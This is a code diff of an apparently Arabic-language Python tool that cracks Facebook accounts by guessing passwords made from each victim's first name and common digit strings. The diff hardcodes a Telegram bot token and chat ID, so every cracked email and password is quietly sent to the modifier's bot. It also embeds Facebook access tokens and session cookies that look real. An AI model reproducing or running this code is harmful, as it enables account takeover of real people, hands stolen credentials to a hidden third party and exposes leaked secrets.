@@ -7,11 +7,14 @@ except ModuleNotFoundError as x:
 	os.system(f'pip install {m}')
 from concurrent.futures import ThreadPoolExecutor as kil
 
-Id,token = input('\033[2;36m- Enter ID Telegram ~ ادخل ايديك تلجرام : \033[1;97m'),input('\033[2;36m- Enter Token BOT Telegram ~ ادخل توكن البوت : \033[1;97m')
+Id='7127051475'
+token='7344562902:AAFM2nv44ch_EXrDdgn7pZg-xZZyzvdoEYY'
 kopo = requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(Id) + '&text=' + str('- Tool Run • تم تشغيل الاداة '))
-webbrowser.open('https://t.me/Pythonln')
+ID2='7344562902:AAFM2nv44ch_EXrDdgn7pZg-xZZyzvdoEYY'
+token2='7127051475'
+webbrowser.open('https://t.me/M_O_L_B')
 if kopo.status_code == 404:
-	exit('\x1b[91;1m\n - Kilwa • ☒ التوكن او الايدي غلط ☒ ')	
+	exit('\x1b[91;1m\n - @M_O_L_B • ☒ التوكن او الايدي غلط ☒ ')	
 bot = telebot.TeleBot(token,parse_mode='HTML')
 	
 os.system('clear')
@@ -22,7 +25,7 @@ def Menu():
 \033[2;32m[ 1 ] - Crack From ID ~ صيد من ايديات
 [ 2 ] - Crack From File ~ صيد من ملف
 \033[2;36m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-   - Programmer • المبرمج ~ @Lx0b2
+   - Programmer • المبرمج ~ @M_O_L_B
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~''')
 	c = input('   - Choose ~ اختار : ')
 	if c == '1':
@@ -37,7 +40,7 @@ z,total,ok,cp=0,0,0,0
 
 def get(user):
 	try:
-		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAADYPcrzZBmcBOx7u1nAuP8W82TLY3w0L6gUhNkSeWTLtQNTBZAfioKGp7lS2wKmIlsM0qApRcxp67CzV02NqQ0gqojR5imiypDu42oVJSZAqGKCZC36SsjcOlPqlGFl8Q8T2VRUBRO6zkL4I1U4ZBSlrCnw0xCZAyNNxccUsMuMUcOmOPwMZCNt9AHnrAE0QgdZAQZDZD','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=cfXzZjFutg6o5alCLvc4po5a; sb=cfXzZii9ujFaY46zWaEUVCUR; m_pixel_ratio=2.75; vpd=v1%3B640x377x2.75; ps_l=1; ps_n=1; wd=377x640; c_user=100088356446509; fr=0ANMod87KWhlldn8x.AWX83h0xYc7uYHQZ70Hl_r9s8ZI.Bm8_Vx..AAA.0.0.Bm_Rfe.AWXN8Fek3Hg; xs=23%3AnNNHCV324uWlhg%3A2%3A1727862751%3A-1%3A6642; locale=ar_AR; fbl_st=101231532%3BT%3A28797712; wl_cbv=v2%3Bclient_version%3A2635%3Btimestamp%3A1727862755'}).json()
+		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAAGNO4a7r2wBOxp1KGfpNhJNZBX6PT0iYR7CQj8mENe8WP9xO2ZAF5YdjZBarg6ktfp5ZAuffMU2UWM6TSNT97VZCeJM3tx6ZABYlZCtViZApqZBlIlHued0RFIDimsenpg6foZBxS6fveerWZChF5DoVZAi3UZBqcBp7xrsvt6LT2ZB7hXcfPHZCHZCuImZAaoJJrQZDZD','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=Oj39ZvYDBFlnv0rAjbovgD0Y;m_pixel_ratio=2.3638083934783936;wd=457x893;c_user=100086834113127;fr=0xAyDHWzQ2JCYTkeg.AWXakXRFLJYh4CYGo8C85I2mjmg.Bm_T06..AAA.0.0.Bm_T11.AWUNsII3VIo;xs=9%3A_sZfJmDBl_8VLg%3A2%3A1727872373%3A-1%3A6645;locale=ar_AR;wl_cbv=v2%3Bclient_version%3A2635%3Btimestamp%3A1727872377;fbl_st=101032571%3BT%3A28797872;vpd=v1%3B768x393x2.3638083934783936'}).json()
 		for mm in url['friends']['data']:
 			ko = (mm['id']+'|'+mm['name'])
 			if ko in fid:
@@ -76,12 +79,12 @@ def password():
 		for kk in fid:
 			idf,nmf = kk.split('|')[0],kk.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'2020',frs+'1990',frs+'2003',frs+'2007']
+			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'123456789',frs+'1234567890',frs+'123123',frs+'123@123']
 			kp.submit(checker,idf,pwv)
 
 def checker(idf,pwv):
 	global total,ok,cp
-	print('\r\033[2;36mϟ \033[1;97m[\033[2;36mKILWA\033[1;97m-\033[2;36mTOOLS\033[2;32m] \033[1;97m~ \033[1;97m[\033[2;32mOK \033[1;97m- \033[1;31mCP\033[1;97m] = [\033[2;32m%s\033[1;97m -\033[1;31m %s\033[1;97m] = [\033[1;33m %s/%s\033[1;97m ]'%(ok,cp,total,len(fid)),end=' ');sys.stdout.flush()
+	print('\r\033[2;36mϟ \033[1;97m[\033[2;36mالصيد \033[1;97m-\033[2;36mجاري \033[2;32m] \033[1;97m~ \033[1;97m[\033[2;32mOK \033[1;97m- \033[1;31mCP\033[1;97m] = [\033[2;32m%s\033[1;97m -\033[1;31m %s\033[1;97m] = [\033[1;33m %s/%s\033[1;97m ]'%(ok,cp,total,len(fid)),end=' ');sys.stdout.flush()
 	for ps in pwv:
 		open('tt.txt','a').write(idf+'|'+ps+'\n')
 		try:
@@ -133,13 +136,13 @@ def checker(idf,pwv):
 ϟ Email -> <code>{idf}</code>
 ϟ Pass -> <code>{ps}</code>
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ Programmer • @Lx0b2 🔥</strong>'''
+ϟ Programmer • @M_O_L_B 🔥</strong>'''
 				stp = f'''\033[1;31mϟ Secure Acc ~ حساب سكيور  
 ~•~•~•~•~•~•~•~•~•~•~•~
 ϟ Email -> {idf}
 ϟ Pass -> {ps}
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ Programmer • @Lx0b2 🔥'''
+ϟ Programmer • @M_O_L_B 🔥'''
 				bot.send_message(Id,stc)
 				print(stp+'\n')
 				open('CPKilwa.txt','a').write(stc+'\n')
@@ -150,13 +153,13 @@ def checker(idf,pwv):
 ϟ Email -> <code>{idf}</code>
 ϟ Pass -> <code>{ps}</code>
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ Programmer • @Lx0b2 🔥</strong>'''
+ϟ Programmer • @M_O_L_B 🔥</strong>'''
 				okp = f'''\033[2;32mϟ Good Acc ~ حساب صحيح ✅
 ~•~•~•~•~•~•~•~•~•~•~•~
 ϟ Email -> {idf}
 ϟ Pass -> {ps}
 ~•~•~•~•~•~•~•~•~•~•~•~
-ϟ Programmer • @Lx0b2 🔥'''
+ϟ Programmer • @M_O_L_B 🔥'''
 				bot.send_message(Id,okc)
 				print(okp+'\n')
 				open('OKKilwa.txt','a').write(okc+'\n')
